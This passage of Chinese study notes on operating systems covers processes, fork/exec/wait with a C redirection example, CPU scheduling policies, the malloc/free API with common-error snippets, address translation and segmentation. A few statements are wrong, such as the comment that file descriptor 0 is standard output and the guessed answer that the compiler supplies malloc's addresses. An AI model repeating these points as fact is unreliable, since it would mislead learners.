操作时，进程的状态会被置为阻塞中，直到 I&#x2F;O 操作完成的事件后，进程的状态将被更新为“就绪”，之后便可以等待调度给 CPU 继续执行余下的指令了；当然，也有可能直接从阻塞状态变成运行状态，取决于事件发生后，在操作系统中设定的调度策略）； 进程其实还有初始、终结等两个状态，它们分别对应进程刚创建时和进程准备退出时的场景； 数据结构操作系统在本质上也是一个程序，它除了提供接口供其他程序（进程）调用外，还同时维护跟踪着所有其他程序（进程）的状态，以实现在不同进程之间的切换；因此，它需要创建一系列的对象（结构）来保存这些信息； 每个进程都有一些元信息，这些信息以“结构”的形态（C 语言中的一种数据类型，类似对象），存储在内存中；当操作系统切换进程时，进程对象的某些属性将会被更新，以便后续重新运行该进程时，可以从之前停止的地方继续执行余下的指令； 3. 插叙：进程 APIfork() 系统调用fork 调用会创建一个子进程，子进程会完全拷贝父进程的一切东西，并且是从调用处的指令开始往下执行剩下的代码，而不是从头开始执行所有代码；这个时候系统中有两个一模一样的进程了，区别只在于父进程的 fork 调用，其返回值是子进程的 pid， 而子进程的 fork 调用返回值是 0（如果调用成功的话）；根据这个返回值，我们就可以区分当前是在哪个进程中，并在接下来运行不同的代码； wait() 系统调用wait 函数可用来控制当前进程的执行进入阻塞状态，一直等到自己的子进程执行完毕后，再从暂停的地方重新开始执行自己的代码； exec() 系统调用fork 让子进程完全拷贝父进程的代码，exec 则可以让新进程运行和原进程完全不一样的东西，并且它并不是通过创建新进程来实现，而是直接在内存中，用被调用的新程序的数据覆盖旧进程的一切数据；如果在 exec() 之后，旧程序还有一部分代码还没有执行的话，则那部分代码就再也没有机会执行了； 为什么这么设计进程 API ？fork 负责创建子进程，exec 负责用新进程覆盖当前进程，这意味着如果两者配合起来使用，可以实现在运行新进程里面，先跑一段子进程的代码，干一点想干的其他事情；整个过程是先创建新的子进程（复制父进程代码），再覆盖该子进程（用其他新代码），其中最大的重点是在覆盖之前做的相关事情，不会影响到父进程，却又能在覆盖之前，引用父进程的环境和代码，做一些准备工作； 上面的这种工作方式，很适合 shell 想要实现的功能，即在 shell 中调用程序（通过 fork 创建新进程，然后 exec 新程序，并且父进程调用 wait 等待子进程的返回）； 12# 重定向的实现原理：shell 在 fork 出子进程后，将子进程的标准输出重定向到 newfile 文件；然后用 exec 调用 wc，接下来 wc 的输出就会进入到文件中了&gt; wc pc.c &gt; newfile.txt 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;// 重定向的实现int main(int argc, char *argv[])&#123; int rc = fork(); if (rc &lt; 0) &#123; fprintf(stderr, &quot;fork failed\\n&quot;); exit(1); &#125; else if (rc == 0) &#123; // 可用的文件描述符是从 0 开始计数的，当创建一个进程时，0 一般绑定到标准输出； // 通过关闭标准输出，将使得 0 描述符回到可用的状态； // 当使用 open 命令打开一个新文件时，它会寻找最小的可用描述符，此时刚好就是 0，因此新文件被绑定到了 0； // 完成绑定后，接下来程序中的所有输出，都会被写入文件中； close(STDOUT_FILENO); open(&quot;./p4.output&quot;, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU); // now exec &quot;wc&quot;... char *myargs[3]; myargs[0] = strdup(&quot;wc&quot;); myargs[1] = strdup(&quot;p3.c&quot;); myargs[2] = NULL; execvp(myargs[0], myargs); &#125; else &#123; // wait 会返回子进程的 pid；如果当前进程没有子进程，则会返回 -1，表示调用错误； int wc = wait(NULL); &#125; return 0;&#125; UNIX shell 中的管道功能也是使用这种方式来实现的；前一个程序的输出，被重定向到管道队列中，然后将下一个程序的输入也重定向到管道队列中，这样就可以实现将上一个程序的输出，无缝的作为下一个程序的输入；其背后使用了 pipe 系统调用； 其他 API关于如果与进程交互，UNIX 中有一系列丰富的工具，常见的包括： ps，查看当前正在运行的进程； top，当前各进程的资源占用情况； kill，给某个进程发送终止的信号； 4. 机制：受限直接执行待解决问题：执行程序的时候，不可避免需要将 CPU 运行指令的权力交给程序，但是却要实现两方面的目标，一是交出 CPU 之后，能够再收回来，避免程序永久性占用；二是程序使用 CPU 执行指令的范围应该受到限制，避免程序访问任意资源；最后，在不同的时间将不同的 CPU 交付给不同的程序使用，不可避免要在程序间切换，因此还需要考虑如何减少切换带来的开销，提高性能； 基本技巧：受限直接执行操作系统执行程序的过程： OS：在进程列表中新增一个条目； OS：为程序分配内存； OS：将程序加载到内存中； OS：根据 argc&#x2F;argv 初始化程序的栈； OS：清除寄存器 OS：将 main 函数的起始地址放入寄存器，以便从该处开始执行指令； 程序：执行 main 函数下的指令 程序：从 main 函数中返回； OS：释放进程的内存； OS：将进程从进程列表中删除； 问题1：受限制的操作程序在执行过程中，不可避免需要使用到一些 I&#x2F;O 操作，为了避免恶意的程序滥用这些操作，在执行指令时，现代操作系统通过提供用户模式和内核模式两种状态，来区别于程序发起的普通操作和受限操作； 当程序开始执行时，默认是运行在用户模式下的；当程序想执行一些受限制的操作时，需要遵守操作系统的约定，调用操作系统提前写好的函数（即系统调用），并将参数传递给该函数去执行；操作系统的函数会执行在内核模式下，它可以执行任意类型的操作，访问任意类型的资源；当然，也可以对程序想要实现的操作先进行一番审核，确保该操作是有权限的，才继续往下，不然可以直接驳回； 每个函数背后其实是一条或多条的指令；当程序按约定执行操作系统提供的函数时，其实就是在执行这些指令；在这些指令中，有一条 trap 指令，当 CPU 执行到该条指令时，会将当前程序的运行模式，从用户模式切换为内核模式，并将下一条指令的地址，修改到操作系统在虚拟内存空间中的指令的对应地址，这样 CPU 接下来就开始执行操作系统自己在开机后，预先加载到内存中的那些指令； 问：程序能否实现不执行 trap 指令，却实现对用户模式的更改？ 答：由于程序被 OS 加载到内存后，一开始默认运行在用户模式下，在此模式下，程序想去修改模式状态的值，应该会被 CPU 拒绝； 问：好奇这个状态值存在哪里？是否存在某个寄存器里面？ 答：所有硬件，在 OS 刚启动时，OS 会准备好一份表格，上面备注当出现某个异常时，需要调用的异常处理的指令地址，并把该地址写入硬件的存储器中；当出现某种异常时，硬件根据存储器中记录的地址，从该地址加载指令，开始执行；此时的硬件相当于被写死了，包括 CPU 也是；当程序尝试调用硬件处理某类事情时，硬件只会按写好的地址处取指令来执行，而不会执行程序给出的指令；如果程序尝试非法访问某些资源时，CPU 会报错，例如段错误； 完善后的 OS 执行程序的流程： OS：初始化陷阱表，指定当出现某种类型的异常时，需要调用哪些指令来处理； OS：将异常处理指令的地址告知 CPU； CPU：记住异常处理指令的地址； OS：在进程表上添加新条目、为程序分配内存、加载程序到内存中、根据 argv 初始化程序栈、初始化内核栈、从陷阱返回； CPU：从内核栈恢复寄存器、切换为用户模式、根据寄存器地址跳转到 main 入口指令； 程序：执行 main、调用系统调用、触发陷阱、陷入 OS（将控制权移交给 OS）； CPU：将寄存器保存到内核栈（因为后续要为应用程序恢复寄存器状态）、切换为内核模式、跳转到陷阱处理指令； OS：执行陷阱处理指令、完成系统调用的工作任务、从陷阱返回； CPU：从内核栈恢复寄存器、切换为用户模式、跳转到陷阱之后的指令地址； 程序：继续执行余下指令、从 main 中返回、调用 exit 系统调用，触发陷阱，陷入 OS； CPU：将寄存器保存到内核栈、切换为内核模式、跳转到陷阱处理指令； OS：释放进程的内存、将进程从进程列表中删除； CPU 的寄存器是供不同的程序轮流使用的，因此如果想要调用另外一个函数 B 做某种运算，其逻辑是当前函数 A 将函数 B 所需要的参数先保存到约定的寄存器中，然后跳转到 B 函数的指令入口地址，开始执行 B 函数；函数 B 的指令会自行到约定的寄存器处查找所需要的参数； 问题2：在进程间切换问：由于 CPU 是供不同程序轮流使用的，而操作系统本质上也不外乎是另外一个大一点的程序，当 CPU 在执行其他程序的指令时，操作系统如何将控制权拿回来呢？ 协作模式早期的方案是让程序每隔一段时间做一次系统调用，这个系统调用其实啥事也不作，唯一实现的效果是将控制权切换回给操作系统；但这种模式有个漏洞，即程序本身要遵守约定才，如果程序是一个恶意程序，操作系统就被架空了；当然，为了防止程序权力不受限制，在该模式下，如果程序尝试做一下非法的动作时，例如访问本不应该访问的内存，或者计算以 0 的除法，则会触发异常，导致控制权转回给 OS，接下来 OS 可能会将程序杀死； 非协作模式显然依赖每个程序都会善意的交回控制权是很危险的，因此需要有另外一种机制保证无论如何 CPU 都可以取得控制权；解决办法就是在 CPU 内置一个时钟中断的功能，它会按照提前设置好的时间值，每隔一段时间就触发一次中断异常，然后执行 OS 的异常指令，这样就将 CPU 的执行权交回给 OS 了；除了将异常处理地址写入 CPU 外，启用 CPU 的时间中断功能，也是操作系统在启动时的必做功课之一，这样它才拥有 CPU 控制权的安全保证； CPU 在触发中断时，需要将当前程序的各种寄存器状态保存下来，以便中断结束后，能够从当前程序的中断继续执行； 保存和恢复上下文当中断时钟触发中断异常后，CPU 控制权交加给 OS，OS 需要决定接下来运行哪个程序；如果是要切换到其他程序，OS 需要负责保存当前程序的上下文（保存到进程结构中），以便将来再回来执行该程序时，能够从中断处继续； 问题3：并发当 OS 在处理某个系统调用时，有可能此时发生了一个中断，因此操作系统现在相当于有两个任务要处理了；如何解决并发的问题，不同的操作系统有不同的策略；既可以单纯的禁止和拒绝（代价是当前任务处理过久的话，有可能丢失未处理的那个任务），也可以是引入锁的机制，并发处理（代价是复杂度大大提高）； 当一个 OS 运行的时间越久，由于各种意料之外的情况的存在，它有可能会慢慢累积越来越多的错误，导致出现一些莫明其妙的问题；因此，定期对 OS 进行重启是一种有益的做法；它可以让操作系统恢复到一个初始状态，这个状态得到了更加充分的测试，存在更少的不确定性； 5. 进程调度：介绍当有多个进程在同时运行的时候，不可避免会出现调度的工作，因此需要制定一个调度的策略，以尽可能提高机器的运行效率； 工作负载假设为了判断不同调度策略的效率，先从做一些最简单和简化的基本假设，来作为讨论的起始点，这些基本假设包括： 所有任务同时到达 CPU 每个任务运行相同的时间 一旦开始某个任务，就一直运行到任务完毕再退出，中间不切换； 所有的工作只涉及 CPU ，不使用其他 I&#x2F;O 设备 CPU 已经提前知道每个工作需要运行多少时间； 调度指标为了比较不同调度策略的好坏，还需要设计一个指标，以便将调度策略的效率进行量化；此处假设使用周转时间作为指标 任务周转时间 &#x3D; 完成时间 - 到达时间； 此处的到达时间指任务到达 CPU 的时间（可以先假设为零，即假设所有任务同一时间到达 CPU，供 CPU 进行调度） 先进先出策略 FIFO先进先出策略（First In First Out）的思想很简单，就是先到达的先处理，等处理完了再处理下一个；后到达的先等待； 它的优点是策略的实现很容易很简单； 它的缺点是有可能会增加平均周转时间，因为有可能先到达的任务是一个非常耗时的任务，而后面的任务是小任务，结果导致大量的小任务被迫等待很久以后才能得到处理； 最短任务优先策略 SJF如果任务同时到达，那么最短任务优先（Shortest Job First）是最优的策略，它可以让平均周转时间最低；但现实的问题是任务常常不会同时到达，这就导致如果先到达的任务是一个大任务，即后续到达的小任务仍然需要被迫等待大任务先执行完成，导致平均周转时间相对先进先出并没有什么变化； 最短完成时间优先策略 STCF最短完成时间优先（Shortest Time-to-Completion First）的思想是，当有多个任务到达 CPU 时，即使 CPU 当前已经在处理某个任务，CPU 仍然会比较一下所有这些任务（包括处理中的）的剩余工作时间，最少的那个优先处理； 但这个策略有一个问题，即 CPU 需要提前知道任务的剩余完成时间，但显然这也是不太可能的； 新度量指标：响应时间前面的三个策略都是针对周转时间这个指标来设计的，这在早期的批处理系统是有意义的。在那个年代，开发人员提前将 CPU 要做的工作先准备好，然后一次性的送入 CPU 执行，然后开发人员静静等待结果即可； 但是 PC 后来进入了个人消费者的时代，用户体验也变得越来越重要，因此，响应时间变成了更重要的指标，而不再是周转时间；由于 CPU 处理能力越来越快，分时系统的引入，让 CPU 能够同时处理多个程序； 轮转策略 RR轮转策略（Round-Robin）的思想，就是将程序的运行时间划分时间中断周期的倍数时间，然后 CPU 在多个任务之间不停的轮转执行，直到某个任务结束退出轮转队列为止； 虽然时间片是中断周期的倍数，但是它并不是越短越好，因为 CPU 切换进程是需要成本的，因此在响应时间和切换时间之间，需要采取一个折中平衡的点； 结合 I&#x2F;O轮转策略并没有从总体上降低所有任务的总完成时间，甚至相反，它基本上都大大延长了周转时间，但是它提高了响应时间，让用户体验更好，减少了等待的感觉；但是当任务需要调用 I&#x2F;O 时，轮转策略的周转时间会有所降低； 无法预知一般来说，操作系统对进程任务需要多少时间才能完成并不了解的，因此前面提出的策略都不好使，因为它们都要求操作系统有未卜先知的能力； 6.调度：多级反馈队列现代操作系统使用的是多级反馈队列策略（MLFQ：Multi-Level Feedback Queue）的调度方法，这个方法最早是在 1962 年的时候提出来的；它的目标是兼顾响应时间和周转时间； 基本规则MLFQ 的基本思想是维护多个不同优先级的队列，每次都优先执行高优先级队列中的任务；如果同一个队列中有多个任务，则在这些任务之间使用轮转策略；一个任务在某个时刻只能处于一个队列中； 接下来的核心是，MLFQ 设计了一套规则，用来观察任务接下来的表现，如果根据规则，某个任务被判断为是一个交互为主的任务（例如频繁放弃 CPU 占用，等待用户的键盘输入），则将调高任务的优先级（即把它从低优先的队列中拉出来，放到高优先级的队列中去）； 在任务刚到达时，系统并不知道它是何种类型的任务，因此默认先将其设为最高优先，如果它短时间内不能完成，则不断降低它的优先级； 规则1：如果 A 的优先级大于 B，运行 A； 规则2：如果 A 的优先级等于 B，轮转运行 A 和 B； 尝试1：如何改变优先级 规则3：任务到达时，先将它放在最高优先级的队列； 规则4a：如果任务完整用完分配给它的第一个时间片的话，降低一个优先级（放入另一个队列中）； 规则4b：如果任务在用完时间之前主动释放 CPU，则优先级保持不变； 截止目前的规则，只会降低优先级的动作，还没有调高优先级的动作，但是一个任务可能在不同的时间阶段，其表现形式不同，比如一开始是计算密集型的，之后变成了交互密集型的；目前的规则会导致该任务在后期的交互响应很慢，甚至直接饿死了； 另外还要防止一些任务出现欺诈，即它本质上是计算密集型的任务，即故意在时间片快结束前主动释放 CPU ，从而维持其优先级不变，糊弄调度程序； 尝试2：提升优先级为了避免综合型任务（前期计算密集型，后期交互密集型）被饿死，需要定期关照一下它们，因此引入规则5； 规则5：每经过一段时间 S，就把系统中所有任务重新加入到最高优先级的队列； 这个规则引入了一个新问题，即 S 的大小如何设置的问题；如果 S 设置得太大，则任务仍然有可能饿死；如果设置得太小，则交互型任务的响应时间变慢； 尝试3：更好的计时方式为了避免被一些恶意任务糊弄，调度策略需要改进原来的规则4，从原本的单次计时制，改变为累计时制，即累计该任务在当前队列已经用了多少时间，而不再像原来一样，如果任务主动释放 CPU，就会重新计时；现在不重新计时了，而是不管有无主动释放，或者释放多少次，只计算该任务在当前优先级的队列中，已经占用和消耗了多少分配给它的 CPU 时间；如果该累计时间已经达到配额的上限，就将它的优先级调低； 规则4（改进版）：如果任务用完了其在某个优先级队列中的时间配额，就将它降低一个优先级（不管它中间是否主动释放 CPU，以及释放了多少次）； MLFQ 调优及其他问题为了更好的提高性能，大多数 MLFQ 的实现都支持给不同的优先级队列设置不同的时间配额，整体原则是优先级越高的队列，时间配额越小，单次执行时间越短，即切换也频繁；而优先级越低的队列，时间配置越大（单次执行时间越久）； 至于每种优先级的具体时间配额应该是多少，以及多长时间提升一次所有任务的优先级，不同的 MLFQ 实现有不同的做法；有些是使用配置表，有些是使用数学公式算法； 有些操作系统有内置的调度策略，但站在用户的层面，该默认策略并一定是用户在运行某个进程时最想要的效果，因此，操作系统一般会提高一些接口，供用户或系统管理员进行调用，用来告知操作系统一些建议，以便操作系统可以基于这些建议，做出更好的调度安排； 7.调度：比例份额之前的调度策略目标是最小化响应时间和周转时间；但是如果换成另外一个目标，即保证每个任务都可以分配到一定比例的 CPU 时间，则会衍生另外一种类型的调度算法：比例份额调度策略； 比例份额策略有一些非常简单的实现思路，即彩票制；即让每个进程拥有一定数量的彩票，然后从彩票池中随机抽奖，抽出哪个号码，就运行拥有该彩票号码的进程；如果某个进程的优先级比例高，则就给它分配多一点的彩票，这样它就被抽中的概率就是提高；反之则是下降； 基本概念：彩票数表示份额彩票制的最大亮点是引入了随机性，虽然随机性在短时间内并不能保证概率符合预期，但是只要足够长的时间，就可以无限接近预期；但是随机性最大的好处在于它可以避免出现传统人工算法可能出现的无法覆盖的极端边角情况； 另外一个好处是随机算法实现起来很容易，没有很多复杂的中间状态值需要记录；因此，它运行起来也更快； 虚拟机的内存分配管理也经常使用彩票制来实现； 彩票机制在原始的彩票调度策略下，为了让操作系统能够更加灵活的应对各种使用场景，额外引入了一些配套的机制来改进原始彩票机制，例如： 用户内部的二次分配：假设用户 A 获得系统分配的100 张彩票，而它内部有两个任务要执行，它可以给这两个任务再做一次分配； 彩票转让机制：一个进程可以临时的将自己的彩票转给另外一个进程，以促进另外一个进程更快的执行； 实现思路彩票调度策略实现思路很简单，仅需要一个随机数生成器、一个链表，一个进程结构（保存进程号和它拥有的彩票数）； 当随机数生成出来后，开始遍历链表，判断当前的彩票数，加上之前已经遍历完的彩票数，看是否会大于出奖号码，如果大于，则当前链表节点即是中奖的进程； 为了让遍历更加有效率，最好能够将链表按彩票数从大到小进行排列，这样有助于更快找到中奖号码； 由于彩票算法存在随机性，这意味着当任务的执行时间很短时，彩票算法的分配效率比较糟糕，即并不是公平分配的，而是随机性很大；只有当任务的执行时间很长，需要很多个时间片时，在分配上面就会越发的公平； 如何分配彩票如何分配彩票这个问题，就彩票机制本身来说，并没有提供任何答案。因为操作系统对于即将要运行的进程是未知的，所以自然也不知道应该分配多少彩票给该进程才算是合理的； 步长调度策略由于彩票制的随机性，在小样本数时表现不好，因此通过引入步长的概念来减少这种随机性；它的基本思路是先用一个统一的大数，来除各个进程的彩票数，这样就得到该进程如果想要积累到该大数，需要走多少步；例如假设大数是 10000，则拥有 200 张彩票的步长 &#x3D; 10000 &#x2F; 200 &#x3D; 50 个步长； 步长调度策略是每走一步，就累加记录当前任务的累计步长；在下一轮分配的时候，优先考虑分配给累计步长数最小的进程； 虽然步长调度去除了随机性，但是其实现比彩票调度稍微复杂一点点，因为需要引入全局状态，记录每个任务的累计步长是多少；另外步长调度仍然也还没是没有解决彩票调度存在的问题，即初始化状态下，应该给一个任务分配多少彩票； 小结彩票调度和步长调度并没有在操作系统中得到广泛的采用，其原因即在于未解决初始状态如何分配彩票的问题，但是它们在一些特殊场景中可以使用，例如虚拟机的实现；因为在这些场景中，初始状态分配多少彩票，由用户给出了答案； 8.多处理器的调度多处理器出现的原因在硬件条件方面的限制，即某个时间点，硬件设计人员无法在不增加太多功耗的情况下，当单核 CPU 实现更快的速度，因此通过在一块芯片上放置多个 CPU 来实现曲线救国；但这也给操作系统和应用程序引入了新的挑战，即如何有效利用多核心的处理器来实现效率的提升； 背景：多处理器架构由于 CPU 寄存器的速度远远大于内存，因此在二者之间引入了一层高速缓存，来缓解速度差异过大导致的性能瓶颈；但单 CPU 的情况下，这个机制将很好的工作；但是当引入多个 CPU 内核，而这些内核又共享相同的高速缓存时，问题将变得微妙了起来，因为有可能 A 核的缓存被 B 核改动，导致 A 核再次访问缓存中的数据时，已经不存在了，A 核不得不再次到内存中读取。这个即是所谓的缓存一致性问题（持久性存储的场景也会面临缓存一致性问题，凡是使用缓存提高存储效率的场景，估计都不可避免会面临这个问题）； 同步问题在引入了多 CPU 后，如果一段修改某个数据的代码，被分配到多个 CPU 上并发执行，将带来灾难性的问题，最终的计算数据常常跟预期的不同。这时需要引入互斥锁来保证数据更新操作的原子性才行； 缓存亲和度某个进程交付给某个 CPU 内核执行后，在该 CPU 的寄存器中将维持很多状态，记录着存储在高速缓存中的数据。此时如果将进程切换交给另外一个 CPU 内核执行，由于新的 CPU 内核的寄存器并不知道原先高速缓存中保存的那些状态数据，因此不得不重新到内存中加载；因此，操作系统在调度进程的时候，最好考虑缓存亲和性，将进程仍交付之前的 CPU 进行处理； 如果多核 CPU 共享一份地址转换表的话，或许可以解决这个问题？ 单队列调度单队列多处理器调度（SQMS：Single Queue Multiprocessor Scheduling）实现起来比较简单，基本复用原来单处理器的调度策略即可，即将所有需要调度的工作，放入一个队列中，当某个 CPU 出现空闲时，就到队列中取走一个任务进行处理；但它的缺点有两个： 为了避免多个 CPU 修改同一份数据，需要给数据加锁，但是加锁会带来性能损失； 进程可能在不同的 CPU 之间切换，导致失去了缓存亲和性； 多队列调度多队列多处理器调度（MQMS：Multi-Queue Multiprocessor Scheduling）让每个 CPU 专享一个自己的队列；当一个任务进来后，操作系统根据一定的规则（如随机挑选或者挑选短的队列）将任务放到某个 CPU 的队列中，接下来就跟单处理器的流程一样了； MQMS 的好处是可以保证亲和性，也无须担心进程在 CPU 之间切换带来的性能开销；但它的缺点是有可能造成资源闲置。即某个 CPU 接到一个大任务导致很忙，而其他 CPU 都是一些小任务，很闲，即所谓的负载不均问题； 负载不均的一个解决办法是定期干预的思路，即当某个 CPU 队列开始变闲时，就将较忙的队列上面的任务迁移一个到较闲的队列中； 这种技术称为“工作窃取”，即闲置的 CPU 每隔一段时间就到繁忙的 CPU 那里窃取一个任务过来；但隔多久去窃取一次是个微妙的设定，因为时间太短太频繁的话，会带来较大的切换性能开销；如果时长太长的话，有可能导致负载不均； Linux 的多处理器调度Linux 社区就使用何种调度程序没有达成共识，共有三种常用方案： O(1)：多队列，基于优先级调度，类似 MLFQ； CFS：多队列，基于比例调度，类似步长调度； BFS：单队列，基于比例调度，采用 EEVEF 算法（最早最合适虚拟截止时间优先算法）； 9.抽象：地址空间早期系统最早的时候，操作系统没有提供任何内存方面的抽象，内存的头部存储着操作系统的系统（当时 OS 还在库时代），然后从某个地址之后存着程序的代码，内存中也只有一个程序，没有其他程序； 由于计算机很贵，需要很多人共用，而不是每人一台；因此 OS 开始需要支持多程序并行；这个时候的办法是引入磁盘的帮助，当需要切换程序的时候，就先将当前内存中的数据保存在磁盘里，然后加载另外一个程序； 由于磁盘很慢，上面的方法导致用户需要等待很久，接下来进一步的办法是将内存划分成多个段，每个程序使用其中一个段，然后切换程序的时候，不需要再跟磁盘打交道，只需要从这个段跳到另外一个段即可； 段的技术不错，不过它也引入了一个新的问题，即如何保护程序数据，避免被其他程序非法访问； 地址空间为了解决隔离的问题，操作系统提供了一种虚拟地址空间的约定，在这个约定中，程序拥有巨大的全部内存空间，就像早期系统刚开始时那样，内存中只有一个程序在运行；同时操作系统还引入了地址翻译器，它会将当前进程指令中的虚拟地址，最终翻译为实际的物理地址，然后从该地址中取到数据； 10.插叙：内存操作 API内存类型C 程度有两种内存类型，一种是栈内存，它会编译器自动分配和回收；还有一种是堆内存，它由用户自行申请分配和自己回收（因此很容易忘了回收）； 调用函数申请分配堆内存后，函数一般会返回分配好的堆内存的地址，接下来一般需要将这个地址存在在栈中，以便供后续的代码使用； 问：使用 malloc 分配内存时，返回的地址，是在编译期间，由编译器给出的，还是在指令执行期间，由操作系统给出的？ 答：猜测可以由编译器给出；执行期间，操作系统分配的是物理内存，返回的是物理地址，并且也只是将物理地址写入到页表当中完成映射而已，并不需要返回给应用程序；理论上编译器管理着整个虚拟地址空间； malloc() 调用malloc 用来申请在堆上分配内存 123void *malloc(size_t size);// 使用示例，一般不直接给 malloc 传递 size 字面值，而是通过 sizeof 表达式来获得 size 值，以避免出现错误double *d = (double *)malloc(sizeof(double)); free() 调用free 用来释放堆上的内存，只需将指针作为参数传递给它即可； 好奇：为什么 free 只需指针，无须 size_t 参数，即可知道应该回收多大的内存空间？ 答：因为在分配该内存块时，在其头部有存储着一些额外的信息，其中一项记录着当前内存块的大小。这意味着实际分配的空间比申请时更大一点点；分配完了后返回的指令实际上并不是指向整个内存块的起始位置，而是在中间，即头部信息之后； 常见错误忘了分配内存123456789// 错误示例char *src = &quot;hello&quot;;char *dst; // 没有分配内存，因此该指针并没有指向堆上的空间，是个空指针strcpy(dst, src);// 正确做法char *src = &quot;hello&quot;;char *dst = (char *) malloc(strlen(src) + 1);strcpy(dst, src); 没有分配足够的内存123456// 错误示例char *src = &quot;hello&quot;;char *dst = (char *) malloc(strlen(src)); // 拷贝字符串时，会在末尾添加结束符，因此长度可能不够，取决于 strlen 返回的值是否包含结束符；strcpy(dst, src); // 缓冲区溢出可能会成为安全漏洞来源 忘记初始化分配的内存没有初始化的内存，并不意味着里面没有值，里面有时候会有前人留下的值，结果导致读取到的内容造成了程序错误 忘记释放内存如果没有释放内存，则程序在长时间运行后，由于反复分配内存，最终有可能造成内存溢出； 在用完之前就释放内存读取的时候很可能会出现预期之外的值； 反复释放内存反复释放同一块的结果不可预期，通常会导致程序崩溃； 错误地调用 free()本来想释放 A 指针指向的内存，结果传入了另外一个错误的值做为 free 的参数，结果意外释放了某处的内存，结果有可能导致程序崩溃； 由于手工分配内存很容易造成各种错误隐患，因此一般使用 purify 和 valgrind 等第三方工具来帮忙检查代码中可能存在的错误调用（有点像 lint 的去毛作用）； 底层操作系统支持malloc 和 free 并不是系统调用，它们是库调用；但是它们本后的实现需要有系统调用，一般是 brk（参数为地址）和 sbrk（参数为增量）；这两个函数用来移动堆顶的指针； 除了 malloc 外，还有一个 mmap 调用可以用来分配内存，它的分配方式跟 malloc 有所不同，是在 swap 交换区中分配一个匿名的内存区域； 其他调用calloc：分配堆内存后，会将其中的内容置 0； realloc：分配一个比传入的数组更大的内存，并把数组内容拷贝到其中，再返回新内存的地址； 11.机制：地址转换CPU 很快，但只有一个，所以它通过分时间段轮流使用的方法来实现共享，为了实现高性能，程序的指令直接送达 CPU 进行处理，操作系统仅在发生系统调用或时钟中断时，才介入处理，以帮忙程序完成一些受限功能或取回硬件的控制权； 内存是存储数据的设备，空间足够大，因此它通过分块使用的方法来实现共享（即空间共享）。在设计内存虚拟化时，也需要考虑高性能、安全可控和简单易用的设计目标；它的实现办法是引入地址转换，即抽象一套足够大的虚拟地址空间，由各个程序专用，这样一来就保证了程序在使用内存时的简单易用和安全可控的目标；之后操作系统通过虚拟地址和物理地址的映射表，来和实际的物理内存打交道，程序则完全不用管。 基址+界限机制早期的地址转换使用基址加界限的机制（也叫动态重定位）来实现，CPU 里面增加基址和界限两个寄存器，实际的物理地址 &#x3D; 虚拟物理地址 + 基址，之后再用界限寄存器的值进行核验，避免程序访问的地址越过了允许的边界； 硬件支持为了实现地址转换，需要硬件提供一些内置功能的支持，包括： 区分运行模式：只有在内核模式下，才能运行特权指令； 基址&amp;界限寄存器：用来存放相应的值； 能够转换地址并校验界限 提供修改基址&amp;界限寄存器的指令：以便操作系统可以为每个进程初始化该值； 可在硬件中注册异常处理的特权指令的地址：以便操作系统可以告知 CPU，在发生异常后，应该去哪些地址加载异常处理指令； 提供异常触发机制：以便在进程试图调用特权指令或者访问越界的内存时，能够触发异常； 操作系统支持为了实现地址转换，需要操作系统提供一些功能的支持，包括： 内存管理：为新进程分配内存、回收已结束进程的内存、更新可用内存表； 基址&amp;界限管理：在切换进程时，正确的设置寄存器中的值； 异常处理：提供异常处理指令，以便当异常被触发时，CPU 可以进行调用； 虽然基址+界限的地址转换方式实现起来很简单，但是它也有很大的局限性，即对内存的利用效率比较低，每个进程内部都有大量的空闲内存（即所谓的内部碎片）； 原因在于应用程序有大有小，对内存有不同的需求，在操作系统在一开始的时候，并不知道应该给应用程序分配多少内存比较合理； 12.分段 如何解决基址&amp;界限机制下的空间浪费问题？ 分段：泛化的基址&amp;界限虚拟地址空间通常遵守惯例对内容进行分段，至少包括：代码段、堆、栈等三段；这三段占用的空间大小不同，代码段是固定大小的，而堆、栈是动态大小的；因此，为了避免普通基址界限机制下的空间浪费问题，可以做进一步细分，引入多个基址界限，分别用于对应不同的段；当需要对某段内的虚拟地址进行转换时，只要先计算出该地址相对于段起始地址的偏移量，之后加上段基址在映射表中的物理地址，即是它在物理内存中的真实地址（当然，还需要使用界限值检查一下，如果超过了范围，就会引发段错误 segmentation fault）； 接下来的问题是，当 CPU 拿到一个虚拟地址时，如何知道它属于哪个段？因为只有知道属于哪个段，并且知道该段的起始地址，才有办法计算偏移量 如何知道引用哪个段有两种方式可以用来判断虚拟地址属于哪个段 显式的方法使用虚拟地址的头两位来判断，例如 00 代表代码段，01 代表堆段，10 代表栈段；虚拟地址拿掉头两位，剩下的即是地址在该段内的偏移量，可以直接和界限比较大小来检验是否越界，并且也可以直接加上基址，获得实际的物理内存地址； 隐式的方法通过虚拟地址的来源来实现，当地址来源于程序计数器时，意味着这个地址是代码段中的地址；当地址是基于栈指针或者堆指针的偏移量计算出来的时候，意味着这个地址是栈地址或者堆地址； 如何处理栈的反向增长其实也很简单，当知道了该地址是一个栈地址后，只需要减去栈的起始地址，即可以得到一个负数的偏移量，然后加上基址，即可以得到实际的物理内存地址； 说明栈空间在物理内存中也是反向增长的； 支持共享不同的进程之间，总是难免会使用到一些相同的数据，例如共享库，如果每个进程都存储一份，显然太浪费空间了。通过引入共享段，可以提高内存的使用效率； 实现办法就是给段地址增加几个位（即保护位），用来标记关于该段是否允许共享、是否可执行等一些额外的信息；如此一来，也给 CPU 增加了一些额外的工作，除了做前述检查虚拟地址是否越界外，还需要检查一下当前指令是否跟标记位有冲突，例如指令尝试向只读的段写入数据，或者尝试运行非执行段中的指令等； 段的颗粒度按代码、栈、堆的方式进行分段，是一种比较粗颗粒度的分段；在早期有些系统的设计中，曾经尝试过更加细颗粒度的分段，当时的目的是为了让内存的使用更加高效，当然，分段越多，意味着需要硬件的支持才可行。 操作系统支持虽然分段的方法减少了内存的浪费，提高了使用效率；但是随着进程的不断创建和销毁，物理内存上将存在着越来越来的内存碎片，这些碎片加起来很大，但是它们却是不连续的。这有可能造成明明还有足够多的空闲内存，但却无法满足新建进程的连续性要求。这时候操作系统需要引入一个算法来管理这些碎片，一方面解决如何为新进程找到最合适的空闲内存片段，另一方面负责整理碎片，通过移动已分配内存，让整个内存使用变得紧凑，大部分的非连续碎片能够挨到一起，形成整段的连续内存，从而减少碎片的存在。 